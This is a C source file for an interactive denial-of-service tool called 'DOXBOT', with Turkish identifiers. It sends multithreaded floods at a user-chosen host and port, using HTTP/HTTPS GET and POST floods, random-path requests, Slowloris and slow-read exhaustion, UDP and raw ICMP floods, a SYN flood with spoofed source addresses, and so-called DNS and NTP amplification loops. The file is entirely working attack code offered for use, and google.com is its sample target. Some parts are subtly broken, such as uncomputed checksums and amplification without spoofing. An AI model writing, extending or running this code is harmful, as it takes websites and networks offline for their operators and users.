#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <netdb.h>
#include <errno.h>

#define MAX_CMD 128
#define PAKET_BOYUT 1400
#define THREAD_SAY 40
#define DNS_SERVER "8.8.8.8"
#define NTP_SERVER "pool.ntp.org"

int devam = 1;
char hedef_ip[16];
char hedef_domain[64];
int hedef_port;
int surec;
int islem_sayisi;
pthread_t *tidler = NULL;
int aktif = 0;

void prompt() {
    printf("\n");
    char *yazi = " root@doxbot ~> ";
    int renkler[] = {17,17,17,17,17,17,17,17,129,129,129,129,129,129,129};
    int len = sizeof(renkler)/sizeof(int);
    for (int i = 0; yazi[i] != '\0'; i++) {
        int r = renkler[i % len];
        printf("\033[48;5;%dm\033[38;5;15m%c", r, yazi[i]);
    }
    printf("\033[0m");
    fflush(stdout);
}

void coz_domain(char *domain) {
    struct hostent *he = gethostbyname(domain);
    if (he) {
        struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
        if (addr_list[0]) {
            strcpy(hedef_ip, inet_ntoa(*addr_list[0]));
            return;
        }
    }
    strcpy(hedef_ip, domain);
}

// ---------- HTTP GET ----------
void *http_get(void *arg) {
    while (devam) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char req[1024];
            snprintf(req, sizeof(req),
                "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
                hedef_domain[0] ? hedef_domain : hedef_ip);
            send(s, req, strlen(req), 0);
        }
        close(s);
        usleep(100);
    }
    return NULL;
}

// ---------- HTTPS ----------
void *https_get(void *arg) {
    while (devam) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(443);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char req[1024];
            snprintf(req, sizeof(req),
                "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
                hedef_domain[0] ? hedef_domain : hedef_ip);
            send(s, req, strlen(req), 0);
        }
        close(s);
        usleep(200);
    }
    return NULL;
}

// ---------- HTTP POST ----------
void *http_post(void *arg) {
    while (devam) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char data[512];
            memset(data, 'A', 512);
            char req[2048];
            snprintf(req, sizeof(req),
                "POST / HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 512\r\nConnection: close\r\n\r\n%s",
                hedef_domain[0] ? hedef_domain : hedef_ip, data);
            send(s, req, strlen(req), 0);
        }
        close(s);
        usleep(150);
    }
    return NULL;
}

// ---------- RANDOM PATH ----------
void *http_random(void *arg) {
    char *yollar[] = {"/admin", "/login", "/api", "/test", "/images", "/css", "/js", "/upload", "/backup", "/config"};
    while (devam) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char path[128];
            snprintf(path, sizeof(path), "%s?%d", yollar[rand() % 10], rand() % 9999);
            char req[1024];
            snprintf(req, sizeof(req),
                "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
                path, hedef_domain[0] ? hedef_domain : hedef_ip);
            send(s, req, strlen(req), 0);
        }
        close(s);
        usleep(50);
    }
    return NULL;
}

// ---------- SLOWLORIS ----------
void *slowloris(void *arg) {
    while (devam) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char req[512];
            snprintf(req, sizeof(req),
                "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nX-Forwarded-For: 192.168.%d.%d\r\n",
                hedef_domain[0] ? hedef_domain : hedef_ip, rand()%255, rand()%255);
            send(s, req, strlen(req), 0);
            for (int i = 0; i < 15 && devam; i++) {
                send(s, "X-Header: keep-alive\r\n", 22, 0);
                usleep(300000);
            }
        }
        close(s);
    }
    return NULL;
}

// ---------- SLOW READ ----------
void *slow_read(void *arg) {
    while (devam) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        if (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char req[512];
            snprintf(req, sizeof(req),
                "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n",
                hedef_domain[0] ? hedef_domain : hedef_ip);
            send(s, req, strlen(req), 0);
            char buffer[1];
            for (int i = 0; i < 10 && devam; i++) {
                recv(s, buffer, 1, 0);
                usleep(500000);
            }
        }
        close(s);
    }
    return NULL;
}

// ---------- UDP ----------
void *udp_flood(void *arg) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return NULL;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    unsigned char *data = malloc(PAKET_BOYUT);
    for (int i = 0; i < PAKET_BOYUT; i++) data[i] = rand() % 256;
    while (devam) {
        sendto(s, data, PAKET_BOYUT, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    free(data);
    close(s);
    return NULL;
}

// ---------- ICMP (root) ----------
void *icmp_flood(void *arg) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s < 0) {
        printf("[-] ICMP: Root gerekli.\n");
        return NULL;
    }
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    struct icmp *icmp = malloc(PAKET_BOYUT);
    icmp->icmp_type = ICMP_ECHO;
    icmp->icmp_code = 0;
    icmp->icmp_id = rand() % 65535;
    icmp->icmp_seq = 0;
    memset(icmp->icmp_data, 'X', PAKET_BOYUT - sizeof(struct icmp));
    icmp->icmp_cksum = 0;
    while (devam) {
        icmp->icmp_cksum = 0;
        icmp->icmp_seq++;
        sendto(s, icmp, PAKET_BOYUT, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    free(icmp);
    close(s);
    return NULL;
}

// ---------- DNS Amplifikasyon ----------
void *dns_amp(void *arg) {
    while (devam) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(53);
        inet_pton(AF_INET, DNS_SERVER, &dst.sin_addr);
        
        unsigned char query[] = {
            0xaa, 0xaa, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x03, 'w', 'w', 'w', 0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00,
            0x00, 0xff, 0x00, 0x01
        };
        sendto(s, query, sizeof(query), 0, (struct sockaddr *)&dst, sizeof(dst));
        close(s);
        usleep(50);
    }
    return NULL;
}

// ---------- NTP Amplifikasyon ----------
void *ntp_amp(void *arg) {
    while (devam) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(123);
        inet_pton(AF_INET, NTP_SERVER, &dst.sin_addr);
        
        unsigned char query[] = {
            0x17, 0x00, 0x02, 0x2a, 0x00, 0x00, 0x00, 0x00
        };
        sendto(s, query, sizeof(query), 0, (struct sockaddr *)&dst, sizeof(dst));
        close(s);
        usleep(50);
    }
    return NULL;
}

// ---------- SYN Flood (root) ----------
void *syn_flood(void *arg) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        printf("[-] SYN: Root gerekli.\n");
        return NULL;
    }
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    
    char packet[40];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(40);
    ip->id = htons(rand() % 65535);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->daddr = dst.sin_addr.s_addr;
    
    tcp->th_off = 5;
    tcp->th_flags = TH_SYN;
    tcp->th_win = htons(65535);
    tcp->th_sum = 0;
    
    while (devam) {
        ip->saddr = rand();
        tcp->th_sport = htons(rand() % 65535 + 1024);
        tcp->th_dport = htons(hedef_port);
        tcp->th_seq = rand();
        tcp->th_sum = 0;
        sendto(s, packet, 40, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    close(s);
    return NULL;
}

void saldiri_baslat(char *domain, int port, int sure, char *metod) {
    strcpy(hedef_domain, domain);
    coz_domain(domain);
    hedef_port = port;
    surec = sure;
    devam = 1;
    
    islem_sayisi = sysconf(_SC_NPROCESSORS_ONLN);
    int toplam = islem_sayisi * THREAD_SAY;

    void *(*fonk)(void *) = NULL;
    char root_uyari[64] = "";
    
    if (strcmp(metod, "http") == 0) fonk = http_get;
    else if (strcmp(metod, "https") == 0) fonk = https_get;
    else if (strcmp(metod, "post") == 0) fonk = http_post;
    else if (strcmp(metod, "random") == 0) fonk = http_random;
    else if (strcmp(metod, "slow") == 0) fonk = slowloris;
    else if (strcmp(metod, "slowread") == 0) fonk = slow_read;
    else if (strcmp(metod, "udp") == 0) fonk = udp_flood;
    else if (strcmp(metod, "icmp") == 0) { fonk = icmp_flood; strcpy(root_uyari, " (ROOT GEREKLİ)"); }
    else if (strcmp(metod, "dns") == 0) fonk = dns_amp;
    else if (strcmp(metod, "ntp") == 0) fonk = ntp_amp;
    else if (strcmp(metod, "syn") == 0) { fonk = syn_flood; strcpy(root_uyari, " (ROOT GEREKLİ)"); }
    else { printf("[-] Metod: http, https, post, random, slow, slowread, udp, icmp, dns, ntp, syn\n"); return; }

    printf("\n[ Attack Info ]\n");
    printf("  Status    Sent successfully!\n");
    printf("  Host      %s (%s)%s\n", domain, hedef_ip, root_uyari);
    printf("  Method    %s\n", metod);
    printf("  Port      %d\n", port);
    printf("  Time      %d\n\n", sure);

    printf("[ Target Info ]\n");
    printf("  Running   1/9999\n\n");
    printf("[+] Saldiri basladi. 'stop' ile durdur.\n");

    tidler = malloc(sizeof(pthread_t) * toplam);
    int idx = 0;
    for (int i = 0; i < islem_sayisi; i++) {
        for (int j = 0; j < THREAD_SAY; j++) {
            pthread_create(&tidler[idx++], NULL, fonk, NULL);
        }
    }
    aktif = toplam;

    time_t basla = time(NULL);
    char girdi[MAX_CMD];
    while (time(NULL) - basla < surec && devam) {
        prompt();
        if (fgets(girdi, sizeof(girdi), stdin) == NULL) break;
        girdi[strcspn(girdi, "\n")] = 0;
        if (strcmp(girdi, "stop") == 0) { devam = 0; break; }
    }

    devam = 0;
    sleep(1);
    for (int i = 0; i < aktif; i++) pthread_join(tidler[i], NULL);
    free(tidler);
    printf("[+] Saldiri tamamlandi.\n");
}

int main() {
    printf("\n=== DOXBOT C (TÜM METODLAR) ===\n");
    printf("Komut: <DOMAIN/IP> <PORT> <SANIYE> <METOD>\n");
    printf("Metodlar: http, https, post, random, slow, slowread, udp, icmp, dns, ntp, syn\n");
    printf("Ornek: google.com 80 60 http\n\n");

    char girdi[MAX_CMD];
    while (1) {
        prompt();
        if (fgets(girdi, sizeof(girdi), stdin) == NULL) break;
        girdi[strcspn(girdi, "\n")] = 0;
        if (strcmp(girdi, "exit") == 0) break;

        char domain[64], metod[20];
        int port, sure;
        if (sscanf(girdi, "%63s %d %d %19s", domain, &port, &sure, metod) == 4) {
            saldiri_baslat(domain, port, sure, metod);
        } else {
            printf("[-] Format: <DOMAIN/IP> <PORT> <SANIYE> <METOD>\n");
        }
    }
    return 0;
}
